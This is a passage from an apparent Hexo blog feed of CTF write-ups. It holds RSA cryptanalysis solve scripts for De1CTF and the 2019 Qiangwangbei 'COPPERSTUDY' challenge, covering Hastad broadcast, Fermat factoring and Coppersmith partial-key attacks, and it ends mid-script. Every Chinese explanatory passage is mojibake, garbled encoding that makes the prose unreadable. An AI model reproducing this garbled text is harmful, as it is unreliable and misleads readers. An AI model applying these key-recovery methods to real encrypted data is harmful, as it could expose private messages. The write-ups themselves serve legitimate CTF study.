class="built_in">pow</span>(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=<span class="built_in">int</span>(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==<span class="built_in">pow</span>(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">int</span>(binascii.hexlify(flag),<span class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==<span class="built_in">pow</span>(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==<span class="built_in">pow</span>(flag,e2,p*q2))</span><br></pre></td></tr></table></figure><p>å…ˆæ±‚pï¼Œå››ç»„æ˜å¯†æ–‡ï¼Œe=4ï¼Œç›´æ¥å¹¿æ’­æ”»å‡»ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œee1=42ï¼Œç›´æ¥å¯†æ–‡å¼€42æ¬¡æ–¹å‘ç°å°±å¯ä»¥äº†ï¼Œee2=3ï¼Œè¿™ä¹ˆå°ï¼Œç›´æ¥c+i*n å¼€ä¸‰æ¬¡æ–¹çˆ†ç ´ã€‚</p><p>å†å¾€ä¸‹çœ‹ï¼Œe=46531ï¼Œnæ˜¯2048 bitï¼Œæ²¡å•¥ç‰¹ç‚¹ï¼ŒçŒœæƒ³på’Œqè¿‡äºæ¥è¿‘ï¼Œä½¿ç”¨wikiä¸Šçš„æ€æƒ³ï¼ŒæˆåŠŸåˆ†è§£nï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d0cdaa9f80b10a9a.png" alt="image.png"></p><p>è§£å‡ºhintï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!</span><br></pre></td></tr></table></figure><p>emmmm</p><p>å¾€ä¸‹çœ‹ï¼Œæœ€ç»ˆçš„flagéƒ¨åˆ†ï¼ŒåŒä¸€ä¸ªflagç”¨ä¸åŒçš„nå’ŒeåŠ å¯†ï¼Œeä¸phiçš„æœ€å¤§å…¬å› æ•°æ˜¯14ï¼Œä¸äº’ç´ ï¼Œä¸€ä¸‹æƒ³èµ·äº† 2018 EIS é«˜æ ¡è¿ç»´æŒ‘æˆ˜èµ›çš„ä¸€é“é¢˜ç›®ï¼Œå¦‚å‡ºä¸€è¾™ã€‚</p><p>åŸºæœ¬æ€æƒ³å°±æ˜¯ eä¸p-1çš„æœ€å¤§å…¬å› æ•°æ˜¯14ï¼Œå¯¼è‡´æœ€å¤šèƒ½æåˆ° flag**14 mod nï¼Œæ²¡æ³•å¾€ä¸‹æï¼Œç”±äºä¸¤ä¸ªnåˆ†åˆ«æ˜¯ p*q1,p*q2,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼Œæ±‚å‡º flag ** 14 (mod p*q1*q2) è¿›è€Œæ±‚å‡º flag**14 (mod q1<em>q2)ï¼Œå‘ç°14 ä¸ (q1-1)\</em>(q2-1) çš„æœ€å¤§å…¬å› æ•°æ˜¯2ï¼Œæˆ‘ä»¬å¾—åˆ° flag**2 mod (q1*q2)ï¼Œå¼€æ–¹å³å¯ã€‚</p><p>æœ€ç»ˆexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(è§£,æœ€å°å…¬å€æ•°)</span></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">p = gmpy2.iroot(GCRT(n,c)[<span class="number">0</span>],<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n= <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line">ce1=<span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">e1 = gmpy2.iroot(ce1,<span class="number">42</span>)[<span class="number">0</span>]</span><br><span class="line">ce2=<span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp=<span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">e2=<span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449290342499311738517</span>-tmp</span><br><span class="line"></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">l = gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835282</span></span><br><span class="line">y = gmpy2.iroot(x*x-n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q1p=x-y</span><br><span class="line">q1q=x+y</span><br><span class="line"><span class="built_in">print</span> n2s(<span class="built_in">pow</span>(c,gmpy2.invert(e,(q1p<span class="number">-1</span>)*(q1q<span class="number">-1</span>)),n))</span><br><span class="line"></span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"></span><br><span class="line">c11 = <span class="built_in">pow</span>(c1,gmpy2.invert(e1/<span class="number">14</span>,(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)),p*q1)</span><br><span class="line">c22 = <span class="built_in">pow</span>(c2,gmpy2.invert(e2/<span class="number">14</span>,(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)),p*q2)</span><br><span class="line"></span><br><span class="line">M,C = GCRT([p*q1,p*q2],[c11,c22])</span><br><span class="line"></span><br><span class="line">new_c = M%(q1*q2)</span><br><span class="line">new_n = q1*q2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> n2s(gmpy2.iroot(<span class="built_in">pow</span>(new_c,gmpy2.invert(<span class="number">7</span>,(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)),new_n),<span class="number">2</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><blockquote><p>de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 å¼ºç½‘æ¯ wp</title>
      <link href="/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/"/>
      <url>/2019/05/27/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="COPPERSTUDY"><a href="#COPPERSTUDY" class="headerlink" title="COPPERSTUDY"></a>COPPERSTUDY</h3><p>ä¿„ç½—æ–¯å¥—å¨ƒä¸€æ ·çš„é¢˜ç›®ï¼Œå’Œå»å¹´ä¸€æ ·ï¼Œä»Šå¹´æ˜¯è€ƒ Coppersmith ç›¸å…³æ”»å‡»ï¼Œä¸»è¦å‚è€ƒctf wiki <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_coppersmith_attack/#known-high-bits-message-attack</a></p><p>githubï¼š<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p>ç¬¬ä¸€å…³ï¼š</p><a id="more"></a><p>å·²çŸ¥æ˜æ–‡çš„é«˜ä½ï¼Œä½72ä½ä¸çŸ¥é“ï¼Œä»<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a> è¿™é‡Œæ‰¾çš„è„šæœ¬ï¼Œæ”¹çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">N=<span class="number">0x8d28bda1fbb8190dd9f530c6c8b388f74749a2a957092bef9bb0d3439950aa22cb1638dd09eee5e08fb5da22d5d063f69b7e2aa087041eea9c9d78440e2abc0b9f5c922f30d69a2bce2416df4f9c5383adac8e933bd10c6cf56352db8e46cc65fc5b8109def1f91d553610a3b05e8c0f66d917c4c47fc04297b8e1817cf84dL</span></span><br><span class="line">length_N = <span class="number">1016</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">Kbits = <span class="number">72</span></span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">C=<span class="number">0x57916d30c7568749b98f0f688bf80c2cd0d3394039b4b3485aa6c094a269f13ee0dec44bc03c5ce5ff2e43384252f3ea658a88f8fc3e90dd022da6842579a6fc1e0adf19323c1188647845b9b938b7610684bab06eae88e40892aaea5503bc1ea5066a4cfc69c08c576d08fa69f28c888afb94b0dd882acd45c6ace2bc49c4L</span></span><br><span class="line">part_m=<span class="number">0x81db7350876267d03e36e3dd70129e08167e715c6508ac4ee1afbd4992ad0ac8a5021ab1c084f8b087ab72a155989816a263213d62449000000000000000000L</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN) <span class="comment">#, implementation=&#x27;NTL&#x27;)</span></span><br><span class="line">pol = (part_m + x)^e - C</span><br><span class="line">dd = pol.degree()</span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span>                                <span class="comment"># b = N</span></span><br><span class="line">epsilon = beta / <span class="number">7</span>                      <span class="comment"># &lt;= beta / 7</span></span><br><span class="line">mm = ceil(beta**<span class="number">2</span> / (dd * epsilon))     <span class="comment"># optimized value</span></span><br><span class="line">tt = floor(dd * mm * ((<span class="number">1</span>/beta) - <span class="number">1</span>))    <span class="comment"># optimized value</span></span><br><span class="line">XX = ceil(N**((beta**<span class="number">2</span>/dd) - epsilon))</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)</span><br><span class="line"></span><br><span class="line">result=part_m+roots[<span class="number">0</span>]</span><br><span class="line"><span class="comment">##result=425073431519458914714078012425419177266636080842324683032155837727713301740606335541361888317818841093831762175806435562415181409265511020138003062793538</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³ï¼š</p><p>å·²çŸ¥ p é«˜ä½æ”»å‡»ï¼Œxman æ’ä½èµ›é è¿™é¢˜ç¿»ç›˜çš„ã€‚ã€‚ç›´æ¥æ‹¿è„šæœ¬æ¥ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0x372d81ecfff69fcb7317e7c0190d03e7f0a4ba85aeee3d98a13286a4b3914a0f5503c3a422b6f7e673c4008b0e77b2fc02c26b47fba10b2b5a2079dbc6402becc7175846854b0f5b0186b3b723b3b82c99ac57bdde624c9bb1b40fde1ffbdede598355ad3c8db3b92eda266b8fa6487bab3b07dfaf6ea27aa55384816f1c6cfdL</span></span><br><span class="line">pp = <span class="number">0x84ff948225107a552a08aea00214eb9f7f97d9dcafa08d04840bebfc5bea2e05b95153f19e79dea79b1486421ed747ca</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c=<span class="number">0xf90f4099336dc4dee753268e2aadf57211415f8fd307829702eef202dc0b5c11d5c8e4627cf90c57d23b4e3ac545aef20773fa9f21a2c49a71bcda715452b0ab62c9b36a7c838868d0e229eede374bff33a7defc1a229a45a1e568cb8e8031e8a8d5a1e36268b5732024fa3b13d77eb33425bf812de98abc7934295041e1367L</span></span><br><span class="line">pbits=<span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>**<span class="number">9</span>):</span><br><span class="line">    p=pp &lt;&lt; <span class="number">9</span></span><br><span class="line">    p +=b</span><br><span class="line">    kbits = pbits-p.nbits()</span><br><span class="line">    p=p&lt;&lt;kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">        p2=<span class="built_in">int</span>(p+roots)</span><br><span class="line">        q=n/<span class="built_in">int</span>(p2)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;p:&quot;</span>,p2</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;q:&quot;</span>,q</span><br><span class="line">        phin = (p2<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å…³ï¼š</p><p>å·²çŸ¥dä½ä½ï¼Œæ‰¾è„šæœ¬è·‘ï¼š<a href="https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/">https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/</a></p><p>è¿™é‡Œå‘äº†å¾ˆä¹…ï¼Œå› ä¸ºç»™çš„dä½ä½æ˜¯512 ä½ï¼Œè·‘è„šæœ¬æ€»æ˜¯æŠ¥é”™ï¼Œä¹‹åæ‰å‘ç°åŸæ¥ç»™çš„ä½æ•°å¤ªå¤šï¼Œä»£ç ä¸­æœ‰ä¸ªæ•°å˜æˆè´Ÿæ•°äº†â€¦</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f5e7d7e274bde309.png" alt="image.png"></p><p>æˆ‘æ”¹æˆäº†åˆ©ç”¨å500ä½ï¼Œå°±å¥½äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span>(<span class="params">p0, kbits, n</span>):</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), 